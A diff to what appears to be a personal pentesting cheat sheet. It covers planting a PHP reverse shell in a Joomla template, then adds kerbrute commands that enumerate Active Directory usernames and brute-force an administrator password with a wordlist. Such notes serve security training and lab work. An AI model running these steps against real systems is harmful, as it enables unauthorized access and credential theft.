@@ -253,3 +253,9 @@ test-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j
 #### Joomla Reverse Shell
 > 1. Go to extensions ---> templates ---> protostar, create new file, rev with extension .php, upload REVERSE SHELL php, acces it via http://<IP>/joomla/rev.php 
 > 1. https://vk9-sec.com/reverse-shell-on-any-cms/
+
+#### Active Directory 
+> 1. Find valid usernames ```/home/jon/Downloads/kerbrute_linux_amd64 userenum --dc 192.168.10.39 -d controller.local /usr/share/seclists/Usernames/top-usernam
+es-shortlist.txt```
+> 2. Try bruteforcing password for a user ```/home/jon/Downloads/kerbrute_linux_amd64 bruteuser --dc 192.168.10.39 -d controller.local /usr/share/wordlists/rockyou.txt adminis
+trator```
